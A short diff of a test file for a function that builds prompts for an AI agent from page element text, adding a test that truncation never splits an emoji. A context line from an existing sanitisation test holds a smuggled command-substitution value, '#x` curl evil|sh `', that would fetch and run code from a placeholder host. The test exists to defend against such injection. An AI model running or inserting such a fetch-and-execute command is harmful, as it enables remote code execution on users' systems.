@@ -106,4 +106,11 @@ describe("buildTellAgentPrompt", () => {
     expect(prompt).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
     expect(prompt).toContain("#x` curl evil|sh `");
   });
+
+  it("never splits an emoji when shortening the element text", () => {
+    // 59 ASCII characters put the emoji's surrogate pair across the cut.
+    const text = `${"a".repeat(59)}\u{1F600}tail`;
+    const prompt = buildTellAgentPrompt({ ...element, text }, "about:blank");
+    expect(prompt).toContain(`"${"a".repeat(59)}\u{1F600}"`);
+  });
 });
